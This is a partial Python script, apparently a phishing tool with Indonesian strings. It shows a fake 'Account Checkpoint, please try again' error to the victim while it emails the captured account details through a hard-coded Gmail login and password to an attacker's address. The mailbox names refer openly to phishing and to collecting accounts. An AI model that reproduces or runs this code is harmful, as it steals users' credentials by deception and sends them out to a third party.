...
x=yagmail.SMTP('dompetphising01@gmail.com','08886650181a')
subject='nyetor akun bang'
logo = """\033[1;94m█████████
...
def main():
	...
	body=(msg)
	print('')
	print('\x1b[00mAccount Checkpoint\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('akuntumbalsub4sub2@gmail.com',subject,body)
